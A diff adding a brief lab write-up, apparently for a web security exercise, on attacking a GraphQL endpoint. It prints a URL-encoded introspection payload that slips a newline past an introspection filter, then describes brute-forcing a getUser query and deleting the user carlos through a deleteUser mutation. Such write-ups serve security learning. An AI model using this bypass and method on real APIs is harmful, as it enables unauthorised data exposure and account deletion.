@@ -1,0 +1,11 @@
+Bruteforce the API Graphql Endpoint 
+Founded graphql endpoint at /api
+
+Set default instrospection query using inQl Burpsuite
+Change the instrospection query to enter after _schema here is the payload
+
+query+IntrospectionQuery+%7b%0a++++__schema+%0A%7b++++++++queryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++subscriptionType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++types+%7b%0a++++++++++++...FullType%0a++++++++%7d%0a++++++++directives+%7b%0a++++++++++++name%0a++++++++++++description%0a++++++++++++locations%0a++++++++++++args+%7b%0a++++++++++++++++...InputValue%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d%0a%0afragment+FullType+on+__Type+%7b%0a++++kind%0a++++name%0a++++description%0a++++fields%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++args+%7b%0a++++++++++++...InputValue%0a++++++++%7d%0a++++++++type+%7b%0a++++++++++++...TypeRef%0a++++++++%7d%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++inputFields+%7b%0a++++++++...InputValue%0a++++%7d%0a++++interfaces+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++enumValues%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++possibleTypes+%7b%0a++++++++...TypeRef%0a++++%7d%0a%7d%0a%0afragment+InputValue+on+__InputValue+%7b%0a++++name%0a++++description%0a++++type+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++defaultValue%0a%7d%0a%0afragment+TypeRef+on+__Type+%7b%0a++++kind%0a++++name%0a++++ofType+%7b%0a++++++++kind%0a++++++++name%0a++++++++ofType+%7b%0a++++++++++++kind%0a++++++++++++name%0a++++++++++++ofType+%7b%0a++++++++++++++++kind%0a++++++++++++++++name%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d
+
+Send the request and save graphql queries to sitemap. Here i notice there is getUser query and mutation to deleteUser.
+to find user Carlos i can bruteforce the getUser query. I found out that user carlos id is 3.
+Now i can use the mutation to delete carlos user.
